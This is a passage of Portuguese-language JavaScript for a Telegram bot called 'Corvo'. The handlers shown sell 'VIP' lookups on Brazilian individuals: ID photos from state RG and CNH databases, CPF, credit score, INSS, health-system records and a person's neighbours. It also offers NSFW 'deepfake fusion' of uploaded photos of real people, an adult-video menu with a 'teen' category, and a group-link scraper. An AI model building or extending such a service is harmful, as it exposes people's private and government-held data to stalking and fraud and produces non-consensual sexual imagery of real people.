    const recent = messageHistory.slice(-limit);

    let msg = `📊 *ÚLTIMAS ${recent.length} MENSAGENS*\n\n`;
    recent.forEach((m, i) => {
        msg += `${i + 1}. 👤 *${m.firstName}* (@${m.username})\n`;
        msg += `   🆔 \`${m.tid}\`\n`;
        msg += `   💬 ${m.messageText}\n`;
        msg += `   ⏰ ${m.timestamp}\n\n`;
    });

    const sentMsg = await ctx.reply(msg, { parse_mode: 'Markdown', ...getAdminMenu() }).catch(() => { });
    if (sentMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, sentMsg.message_id).catch(() => { }), 60000);
});

// Handler removido (duplicado)

bot.hears('✉️ • Enviar Mensagem', async (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;
    safeDeleteMessage(ctx, ctx.message?.message_id, 500);
    userStates[ctx.from.id] = 'wait_send_message_id';
    const sentMsg = await ctx.reply(
        '✉️ • *ENVIAR MENSAGEM PARA USUÁRIO*\n\n' +
        'Envie o *ID* do usuário que deseja enviar mensagem.\n\n' +
        'Exemplo: `123456789`',
        { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }
    );
});

bot.hears('🌐 • Sites Oficiais', (ctx) => {
    ctx.reply('🌐 • *Nossos Sites e Suporte Oficial:*', { parse_mode: 'Markdown', ...getSitesInline() }).catch(() => { });
});

bot.hears('🛠️ • FERRAMENTAS ELITE', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    const sentMsg = await ctx.reply('🛠️ • *MENU DE FERRAMENTAS CORVO DIV*\n\nSelecione a ferramenta que deseja utilizar:', { parse_mode: 'Markdown', ...getToolsMenu() }).catch(() => { });
    await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
});

bot.hears('🎬 • Mídias', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    const sentMsg = await ctx.reply('🎬 • *MENU DE MÍDIAS CORVO DIV*\n\nSelecione a plataforma para baixar o vídeo:', { parse_mode: 'Markdown', ...getMidiasMenu() }).catch(() => { });
    await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
});

bot.hears('📸 • Instagram', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    userStates[tid] = 'wait_instagram_url';
    const sentMsg = await ctx.reply('📸 • *DOWNLOAD INSTAGRAM*\n\nEnvie o link do vídeo/reels do Instagram que deseja baixar.', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
    await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
});

bot.hears('🎵 • TikTok', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    userStates[tid] = 'wait_tiktok_url';
    const sentMsg = await ctx.reply('🎵 • *DOWNLOAD TIKTOK*\n\nEnvie o link do vídeo do TikTok que deseja baixar.', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
    await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
});


bot.hears('APIS • CONSULTAS', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    const sentMsg = await ctx.reply('🚀 • *APIs • consultas*\n\nClique no botão abaixo:', {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.url('🔗 • Abrir Telegram', 'https://t.me/GonzalesSuportebot')]
        ])
    }).catch(() => { });
    await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
});

bot.hears('🔍 • CONSULTAS VIP', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    const sentMsg = await ctx.reply('🔍 • *MENU DE CONSULTAS CORVO BOT*\n\nSelecione o tipo de consulta que deseja realizar:', { parse_mode: 'Markdown', ...getConsultasMenu() }).catch(() => { });
    await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
});

bot.hears('👤 • FOTO SP', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_foto_sp';
    ctx.reply('<blockquote>👤 <b>PUXAR FOTO (SÃO PAULO)</b>\n\nEnvie o número do <b>RG</b> para buscar na base de SP:</blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('👤 • FOTO RJ', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_foto_rj';
    ctx.reply('<blockquote>👤 <b>PUXAR FOTO (RIO DE JANEIRO)</b>\n\nEnvie o número do <b>RG</b> para buscar na base do RJ:</blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('👤 • FOTO BA', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_foto_ba';
    ctx.reply('<blockquote>👤 <b>PUXAR FOTO (BAHIA)</b>\n\nEnvie o número do <b>RG</b> para buscar na base da BA:</blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('👤 • FOTO NACIONAL', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_foto_nacional';
    ctx.reply('<blockquote>👤 <b>PUXAR FOTO (NACIONAL)</b>\n\nEnvie o número do <b>CPF</b> para buscar na base de CNH Nacional:</blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🔍 • CPF', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_cpf_basico';
    ctx.reply('🔍 • <b>CONSULTA CPF</b>\n\nEnvie o CPF:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🔍 • Credilink', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_credilink_cpf';
    ctx.reply('🔍 • <b>CONSULTA CREDILINK</b>\n\nEnvie o CPF completo:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('💀 • Óbito', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_obito';
    ctx.reply('💀 • <b>CONSULTA ÓBITO</b>\n\nEnvie o CPF para consultar na base de óbitos:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('💼 • Empresa (QSA)', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_qsa';
    ctx.reply('💼 • <b>CONSULTA QSA</b>\n\nEnvie o CNPJ para listar o quadro societário:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🚘 • RENAVAM', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_renavam';
    ctx.reply('🚘 • <b>CONSULTA RENAVAM</b>\n\nEnvie o número do Renavam:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('👴 • INSS', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_inss';
    ctx.reply('👴 • <b>CONSULTA INSS</b>\n\nEnvie o CPF ou NB do beneficiário:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🪪 • RG Nacional', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_rg';
    ctx.reply('🪪 • <b>CONSULTA RG</b>\n\nEnvie o número do RG:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('📱 • Operadora', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_operadora';
    ctx.reply('📱 • <b>CONSULTA OPERADORA</b>\n\nEnvie o número de telefone:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🔍 • Tel', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_tel';
    ctx.reply('🔍 • <b>CONSULTA TELEFONE</b>\n\nEnvie o número:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🔍 • SIPNI', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_sipni';
    ctx.reply('🔍 • <b>CONSULTA SIPNI</b>\n\nEnvie o CPF:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🔍 • SISREG', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_sisreg';
    ctx.reply('🔍 • <b>CONSULTA SISREG</b>\n\nEnvie o CPF:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🔍 • BIN CARTÃO', async (ctx) => {
    if (!(await canUserConsult(ctx))) return;
    userStates[ctx.from.id] = 'wait_bin';
    ctx.reply('<blockquote>💳 <b>CONSULTA DE BIN</b>\n\nEnvie os 6 primeiros dígitos do cartão:</blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • VOLTAR']]).resize() });
});

bot.hears('🔍 • BANCOS (COMPE)', async (ctx) => {
    ctx.reply('⏳ • <b>Listando bancos brasileiros...</b>', { parse_mode: 'HTML' });
    try {
        const res = await axios.get('https://brasilapi.com.br/api/banks/v1');
        const list = res.data.slice(0, 15).map(b => `• <code>${b.code || '---'}</code> - ${b.name}`).join('\n');
        ctx.reply(`<blockquote>🏛️ <b>BANCOS BRASILEIROS</b>\n\n${list}\n\n...e mais <b>${res.data.length - 15}</b> bancos.</blockquote>`, { parse_mode: 'HTML' });
    } catch (e) { ctx.reply('❌ • Erro ao listar bancos.'); }
});

bot.hears('🔍 • DDD/ESTADO', async (ctx) => {
    userStates[ctx.from.id] = 'wait_ddd';
    ctx.reply('<blockquote>📞 <b>CONSULTA DE DDD</b>\n\nInforme o DDD (apenas números):</blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • VOLTAR']]).resize() });
});

bot.hears('💰 • CRIPTO HOJE', async (ctx) => {
    ctx.reply('⏳ • <b>Consultando mercado cripto...</b>', { parse_mode: 'HTML' });
    try {
        const res = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana&vs_currencies=brl');
        const d = res.data;
        const msg = `<blockquote>💰 <b>MERCADO CRIPTO (BRL)</b>\n\n` +
            `₿ <b>Bitcoin:</b> <code>R$ ${d.bitcoin.brl.toLocaleString('pt-BR')}</code>\n` +
            `Ξ <b>Ethereum:</b> <code>R$ ${d.ethereum.brl.toLocaleString('pt-BR')}</code>\n` +
            `☀️ <b>Solana:</b> <code>R$ ${d.solana.brl.toLocaleString('pt-BR')}</code></blockquote>`;
        ctx.reply(msg, { parse_mode: 'HTML' });
    } catch (e) { ctx.reply('❌ • Erro ao consultar cripto.'); }
});
bot.hears('🔍 • Nome Pro', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_nome_pro';
    ctx.reply('🔍 • <b>CONSULTA NOME PRO</b>\n\nEnvie o nome completo:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🔍 • Score', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_score';
    ctx.reply('🔍 • <b>CONSULTA SCORE</b>\n\nEnvie o CPF:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('👥 • Vizinhos', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_vizinhos';
    ctx.reply('👥 • <b>CONSULTA VIZINHOS</b>\n\nEnvie o CPF para buscar vizinhos:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🔍 • E-mail', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_email';
    ctx.reply('🔍 • <b>CONSULTA E-MAIL</b>\n\nEnvie o e-mail:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🔍 • Instagram', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_instagram_osint';
    ctx.reply('🔍 • <b>CONSULTA INSTAGRAM</b>\n\nEnvie o @username do Instagram:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🔍 • CNS', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_cns';
    ctx.reply('🔍 • <b>CONSULTA CNS</b>\n\nEnvie o CPF:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🔍 • PIS', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_pis';
    ctx.reply('🔍 • <b>CONSULTA PIS</b>\n\nEnvie o CPF:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🔍 • CRM', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_crm';
    ctx.reply('🔍 • <b>CONSULTA CRM</b>\n\nEnvie o CPF:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🔍 • OAB', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_oab';
    ctx.reply('🔍 • <b>CONSULTA OAB</b>\n\nEnvie o CPF:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🔍 • CNH', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_cnh';
    ctx.reply('🔍 • <b>CONSULTA CNH</b>\n\nEnvie o CPF:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🔍 • BIN', async (ctx) => {
    const tid = ctx.from.id;
    if (!(await canUserConsult(ctx))) return;
    userStates[tid] = 'wait_bin';
    ctx.reply('🔍 • <b>CONSULTA BIN</b>\n\nEnvie os 6 primeiros dígitos do cartão:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🛰️ • Rastreios', async (ctx) => {
    userStates[ctx.from.id] = 'wait_track';
    ctx.reply('🛰️ • <b>SISTEMA DE RASTREIO</b>\n\nEnvie o código:', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🔍 • Logs', async (ctx) => {
    ctx.reply('🔍 • <b>CONSULTAR LOGS</b>\n\nRecurso em manutenção.', { parse_mode: 'HTML' });
});

bot.hears('👤 • Perfil', async (ctx) => {
    userStates[ctx.from.id] = 'wait_profile_search';
    ctx.reply('👤 • <b>BUSCAR PERFIL</b>\n\nEnvie o ID ou @user:', { parse_mode: 'HTML' });
});

bot.hears('🌐 • Consultar IP', async (ctx) => {
    if (!(await canUserConsult(ctx))) return;
    userStates[ctx.from.id] = 'wait_ip';
    ctx.reply('🌐 • *CONSULTA DE IP*\n\nEnvie o endereço IP que deseja consultar.\nExemplo: `1.1.1.1`', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
});

bot.hears('📮 • Consultar CEP', async (ctx) => {
    if (!(await canUserConsult(ctx))) return;
    userStates[ctx.from.id] = 'wait_cep';
    ctx.reply('📮 • *CONSULTA DE CEP*\n\nEnvie o CEP que deseja consultar (apenas números).\nExemplo: `01001000`', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
});

bot.hears('🏢 • Consultar CNPJ', async (ctx) => {
    if (!(await canUserConsult(ctx))) return;
    userStates[ctx.from.id] = 'wait_cnpj';
    ctx.reply('🏢 • *CONSULTA DE CNPJ*\n\nEnvie o CNPJ que deseja consultar (apenas números).\nExemplo: `00000000000191`', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() }).catch(() => { });
});

bot.hears('☁️ • Clima', async (ctx) => {
    userStates[ctx.from.id] = 'wait_clima';
    ctx.reply('☁️ • <b>PREVISÃO DO TEMPO</b>\n\nEnvie o nome da cidade (Ex: São Paulo, Rio de Janeiro):', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
});

bot.hears('🌐 • TRADUTOR IA', async (ctx) => {
    const tid = ctx.from.id;
    if (!isUserVip(tid)) return ctx.reply('<blockquote>⚠️ <b>ACESSO RESTRITO</b>\n\nEssa função está disponível apenas para usuários <b>VIP ELITE</b>.</blockquote>', { parse_mode: 'HTML' });
    userStates[tid] = 'wait_ai_translate';
    ctx.reply('<blockquote>🌐 <b>TRADUTOR IA ELITE</b>\n\nDigite o texto que deseja traduzir e o idioma de destino.\n\nEx: <i>Hello world para Português</i></blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • VOLTAR']]).resize() });
});

bot.hears('📝 • RESUMIR TEXTO', async (ctx) => {
    const tid = ctx.from.id;
    if (!isUserVip(tid)) return ctx.reply('<blockquote>⚠️ <b>ACESSO RESTRITO</b>\n\nEssa função está disponível apenas para usuários <b>VIP ELITE</b>.</blockquote>', { parse_mode: 'HTML' });
    userStates[tid] = 'wait_ai_summarize';
    ctx.reply('<blockquote>📝 <b>RESUMIDOR DE TEXTO IA</b>\n\nEnvie o texto longo que você deseja que eu resuma:</blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • VOLTAR']]).resize() });
});

bot.hears('💻 • GERAR CÓDIGO', async (ctx) => {
    const tid = ctx.from.id;
    if (!isUserVip(tid)) return ctx.reply('<blockquote>⚠️ <b>ACESSO RESTRITO</b>\n\nEssa função está disponível apenas para usuários <b>VIP ELITE</b>.</blockquote>', { parse_mode: 'HTML' });
    userStates[tid] = 'wait_ai_code';
    ctx.reply('<blockquote>💻 <b>GERADOR DE CÓDIGO IA</b>\n\nDescreva a função ou script que você precisa.\n\nEx: <i>Uma função em JS para validar CPF</i></blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • VOLTAR']]).resize() });
});

bot.hears('🚗 • CONSULTA PLACA', async (ctx) => {
    if (!(await canUserConsult(ctx))) return;
    userStates[ctx.from.id] = 'wait_placa';
    ctx.reply('<blockquote>🚗 <b>CONSULTA DE PLACA</b>\n\nEnvie a placa do veículo (Ex: ABC1234 ou ABC1D23):</blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • VOLTAR']]).resize() });
});

bot.hears('🧠 • CHAT DE IA', async (ctx) => {
    const tid = ctx.from.id;
    if (!isUserVip(tid)) return ctx.reply('<blockquote>⚠️ <b>ACESSO RESTRITO</b>\n\nEssa função está disponível apenas para usuários <b>VIP ELITE</b>.</blockquote>', { parse_mode: 'HTML' });
    userStates[tid] = 'wait_ai_chat_prompt';
    ctx.reply('<blockquote>🧠 <b>CHAT INTELIGENTE (IA) ELITE</b>\n\nEstou pronto para responder qualquer pergunta ou criar conteúdos para você.\n\n<i>O que você deseja saber hoje?</i></blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • VOLTAR']]).resize() });
});

bot.hears('🎨 • GERAR FOTO (IA)', async (ctx) => {
    const tid = ctx.from.id;
    if (!isUserVip(tid)) return ctx.reply('<blockquote>⚠️ <b>ACESSO RESTRITO</b>\n\nEssa função está disponível apenas para usuários <b>VIP ELITE</b>.</blockquote>', { parse_mode: 'HTML' });
    userStates[tid] = 'wait_ai_photo_prompt';
    ctx.reply('<blockquote>🎨 <b>GERADOR DE ARTE ELITE</b>\n\nDescreva a imagem que deseja criar em detalhes.\n\nEx: <i>Um corvo mecânico em Marte sob luz neon</i></blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • VOLTAR']]).resize() });
});

bot.hears('🎬 • CRIAR VÍDEO (IA)', async (ctx) => {
    const tid = ctx.from.id;
    if (!isUserVip(tid)) return ctx.reply('<blockquote>⚠️ <b>ACESSO RESTRITO</b>\n\nEssa função está disponível apenas para usuários <b>VIP ELITE</b>.</blockquote>', { parse_mode: 'HTML' });
    userStates[tid] = 'wait_ai_video_prompt';
    ctx.reply('<blockquote>🎬 <b>GERADOR DE VÍDEO (BETA)</b>\n\nDigite o prompt para gerar um teaser curto de IA:</blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • VOLTAR']]).resize() });
});

bot.hears('🔞 • IA ADULTA (NSFW)', async (ctx) => {
    const tid = ctx.from.id;
    if (!isUserVip(tid)) return ctx.reply('<blockquote>⚠️ <b>ACESSO RESTRITO</b>\n\nA IA Adulta está disponível apenas para usuários <b>VIP ELITE</b>.</blockquote>', { parse_mode: 'HTML' });
    ctx.reply('<blockquote>🔞 <b>PAINEL ADULTO ELITE (NSFW)</b>\n\nSelecione o motor de geração ou a ferramenta de fusão.</blockquote>', { parse_mode: 'HTML', ...getAdultMenu() });
});

bot.hears('🔞 • GERAR ARTE (NSFW)', async (ctx) => {
    const tid = ctx.from.id;
    if (!isUserVip(tid)) return;
    userStates[tid] = 'wait_ai_nsfw_prompt';
    ctx.reply('<blockquote>🔞 <b>GERADOR DE ARTE NSFW</b>\n\nDescreva a imagem adulta que deseja criar:</blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • VOLTAR']]).resize() });
});

bot.hears('🔞 • FUSÃO (DEEPFAKE)', async (ctx) => {
    const tid = ctx.from.id;
    if (!isUserVip(tid)) return;
    userStates[tid] = 'wait_ai_fusion_photo1';
    ctx.reply('<blockquote>🔞 <b>DEEPFAKE FUSION ELITE</b>\n\nEnvie a <b>PRIMEIRA FOTO</b> (ex: a pessoa principal).</blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • VOLTAR']]).resize() });
});

bot.hears('🔞 • HENTAI IA', async (ctx) => {
    const tid = ctx.from.id;
    if (!isUserVip(tid)) return;
    const waitMsg = await ctx.reply('<blockquote>🔞 <b>BUSCANDO HENTAI ELITE...</b></blockquote>', { parse_mode: 'HTML' });
    try {
        const types = ['waifu', 'neko', 'trap', 'blowjob'];
        const type = types[Math.floor(Math.random() * types.length)];
        const res = await axios.get(`https://api.waifu.pics/nsfw/${type}`);
        await ctx.replyWithPhoto(res.data.url, { caption: '<blockquote>🔞 <b>HENTAI IA GERADO</b>\n\n🚀 <i>Corvo Intelligence System</i></blockquote>', parse_mode: 'HTML' });
        await bot.telegram.deleteMessage(ctx.chat.id, waitMsg.message_id).catch(() => { });
    } catch (e) {
        bot.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, null, '❌ • Erro ao buscar imagem.');
    }
});

bot.hears('🎬 • VÍDEOS ADULTOS', async (ctx) => {
    const tid = ctx.from.id;
    if (!isUserVip(tid)) return;
    ctx.reply('<blockquote>🎬 <b>VÍDEOS ADULTOS ELITE</b>\n\nSelecione a categoria para receber um link direto ou arquivo (Beta):</blockquote>', {
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🔞 • Amador', 'search_adult_amador'), Markup.button.callback('🔞 • Anal', 'search_adult_anal')],
            [Markup.button.callback('🔞 • Novinha', 'search_adult_teen'), Markup.button.callback('🔞 • Milf', 'search_adult_milf')]
        ])
    });
});

bot.hears('🎭 • IA STUDIO (AVATAR)', async (ctx) => {
    const tid = ctx.from.id;
    if (!isUserVip(tid)) return ctx.reply('<blockquote>⚠️ <b>ACESSO RESTRITO</b>\n\nO IA Studio está disponível apenas para usuários <b>VIP ELITE</b>.</blockquote>', { parse_mode: 'HTML' });
    userStates[tid] = 'wait_ai_transformer_media';
    ctx.reply('<blockquote>🎭 <b>IA STUDIO ELITE (AVATAR)</b>\n\nEnvie uma <b>FOTO</b> sua para eu transformar você em qualquer cenário!\n\n<i>Ex: Piloto de avião, Guerreiro Viking, Astronauta, etc.</i></blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • VOLTAR']]).resize() });
});

bot.hears('🎬 • IA VIDEO ACTION', async (ctx) => {
    const tid = ctx.from.id;
    if (!isUserVip(tid)) return ctx.reply('<blockquote>⚠️ <b>ACESSO RESTRITO</b>\n\nA IA Video Action está disponível apenas para usuários <b>VIP ELITE</b>.</blockquote>', { parse_mode: 'HTML' });
    userStates[tid] = 'wait_ai_transformer_media';
    ctx.reply('<blockquote>🎬 <b>IA VIDEO ACTION ELITE</b>\n\nEnvie uma <b>FOTO</b> para eu transformar em um vídeo de ação!\n\n<i>Ex: Atirando com fuzil, dirigindo carro em alta velocidade, lutando boxe.</i></blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • VOLTAR']]).resize() });
});

bot.hears('📄 • GERAR DOC (IA)', async (ctx) => {
    const tid = ctx.from.id;
    if (!isUserVip(tid)) return ctx.reply('<blockquote>⚠️ <b>ACESSO RESTRITO</b>\n\nEssa função está disponível apenas para usuários <b>VIP ELITE</b>.</blockquote>', { parse_mode: 'HTML' });
    userStates[tid] = 'wait_ai_doc_prompt';
    ctx.reply('<blockquote>📄 <b>GERADOR DE DOCUMENTOS IA</b>\n\nDescreva o documento que deseja criar em português.\n\nEx: <i>Um contrato de venda de carro</i> ou <i>Um roteiro de vídeo para TikTok</i></blockquote>', { parse_mode: 'HTML', ...Markup.keyboard([['🔙 • VOLTAR']]).resize() });
});

bot.hears('📢 • POSTAR STATUS', async (ctx) => {
    const tid = ctx.from.id;
    if (!userSessions[tid]) return ctx.reply('<blockquote>⚠️ <b>WHATSAPP DESCONECTADO</b>\n\nConecte seu WhatsApp para postar no status.</blockquote>', { parse_mode: 'HTML' });

    await ctx.reply('<blockquote>📢 <b>POSTANDO NO STATUS...</b>\n\nBuscando memes engraçados e preparando as atualizações do Corvo.</blockquote>', { parse_mode: 'HTML' });
    await postToWhatsAppStatus(tid);
    ctx.reply('<blockquote>✅ <b>STATUS ATUALIZADO!</b>\n\nSuas atualizações e um meme foram postados no seu status do WhatsApp.</blockquote>', { parse_mode: 'HTML' });
});

bot.hears('🪙 • Moedas', async (ctx) => {
    ctx.reply('⏳ • <b>Consultando cotações em tempo real...</b>', { parse_mode: 'HTML' }).catch(() => { });
    try {
        const res = await axios.get('https://economia.awesomeapi.com.br/last/USD-BRL,EUR-BRL,BTC-BRL');
        const d = res.data;
        let msg = `<blockquote>🪙 <b>COTAÇÃO DE MOEDAS</b>\n\n` +
            `💵 <b>Dólar (USD):</b> <code>R$ ${parseFloat(d.USDBRL.bid).toFixed(2)}</code>\n` +
            `💶 <b>Euro (EUR):</b> <code>R$ ${parseFloat(d.EURBRL.bid).toFixed(2)}</code>\n` +
            `₿ <b>Bitcoin (BTC):</b> <code>R$ ${parseFloat(d.BTCBRL.bid).toLocaleString('pt-BR')}</code>\n\n` +
            `⚡ <i>Corvo Intelligence System</i></blockquote>`;
        ctx.reply(msg, { parse_mode: 'HTML' });
    } catch (e) {
        ctx.reply('<blockquote>❌ <b>ERRO AO CONSULTAR COTAÇÕES</b></blockquote>', { parse_mode: 'HTML' });
    }
});

bot.hears('📡 • Scraper', async (ctx) => {
    const tid = ctx.from.id;
    try {
        const loadingMsg = await ctx.reply('📡 • *INICIANDO SCRAPER DE GRUPOS...*\n\n⏳ Isso pode levar alguns minutos...', { parse_mode: 'Markdown' });

        async function updateProgress(text) {
            await bot.telegram.editMessageText(tid, loadingMsg.message_id, null, text, { parse_mode: 'Markdown', disable_web_page_preview: true }).catch(() => { });
        }

        const links = await runGroupScraper(async (progress) => {
            await updateProgress(`📡 • *SCRAPER EM EXECUÇÃO...*\n\n${progress}`);
        });

        if (!links || links.length === 0) {
            return updateProgress('❌ • Nenhum link encontrado.');
        }

        let message = `✅ • *SCRAPER FINALIZADO!*\n\nForam encontrados *${links.length}* links de grupos ativos.\n\n*LISTA COMPLETA:*\n\n`;
        let currentPart = message;
        const parts = [];

        links.forEach((link, i) => {
            const line = `${i + 1}. ${link}\n`;
            if ((currentPart + line).length > 4000) {
                parts.push(currentPart);
                currentPart = line;
            } else {
                currentPart += line;
            }
        });
        parts.push(currentPart);

        await updateProgress(parts[0]);

        for (let i = 1; i < parts.length; i++) {
            await ctx.reply(parts[i], { disable_web_page_preview: true }).catch(() => { });
        }

        await ctx.reply(`🏁 • *SISTEMA CORVO DIV FINALIZADO*`, { parse_mode: 'Markdown' }).catch(() => { });

    } catch (err) {
        logEvent('ERROR', `Erro na execução do scraper: ${err.message}`);
        ctx.reply('❌ • Ocorreu um erro ao executar o scraper.').catch(() => { });
    }
});

// --- BUSCAR GRUPOS NA WEB ---
bot.hears('🔍 • Buscar Grupos Web', async (ctx) => {
    const tid = ctx.from.id;
    try {
        // Mostra mensagem de carregamento
        const loadingMsg = await ctx.reply('🔍 • *BUSCANDO GRUPOS NA INTERNET...*\n\n⏳ Procurando em várias fontes...', { parse_mode: 'Markdown' });

        // Inicializa ou incrementa a página do usuário
        if (!userWebGroupsPage[tid]) {
